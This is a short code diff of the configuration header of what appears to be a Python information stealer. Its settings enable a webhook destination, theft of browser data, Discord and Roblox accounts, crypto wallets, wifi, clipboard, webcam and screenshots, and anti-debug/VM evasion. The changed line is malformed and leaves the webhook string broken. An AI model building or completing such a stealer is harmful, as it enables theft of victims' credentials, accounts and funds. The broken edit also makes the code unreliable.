@@ -1,5 +1,5 @@
 __CONFIG__ = {'webhook': 
-'PASTE', 'ping': False, 'pingtype': 'Here', 'fakeerror': False, 'startup': False, 'bound_startup': False, 'defender': False, 'systeminfo': True, 'common_files': True, 'browser': True, 'roblox': True, 'obfuscation': False, 'injection': False, 'wifi': True, 'antidebug_vm': True, 'discord': True, 'anti_spam': True, 'self_destruct': False, 'clipboard': True, 'webcam': True, 'games': True, 'screenshot': True, 'mutex': 'TuvZSp6rrzY4DERm', 'wallets': True}
+', 'ping': False, 'pingtype': 'Here', 'fakeerror': False, 'startup': False, 'bound_startup': False, 'defender': False, 'systeminfo': True, 'common_files': True, 'browser': True, 'roblox': True, 'obfuscation': False, 'injection': False, 'wifi': True, 'antidebug_vm': True, 'discord': True, 'anti_spam': True, 'self_destruct': False, 'clipboard': True, 'webcam': True, 'games': True, 'screenshot': True, 'mutex': 'TuvZSp6rrzY4DERm', 'wallets': True}
 
 import concurrent.futures
 import ctypes
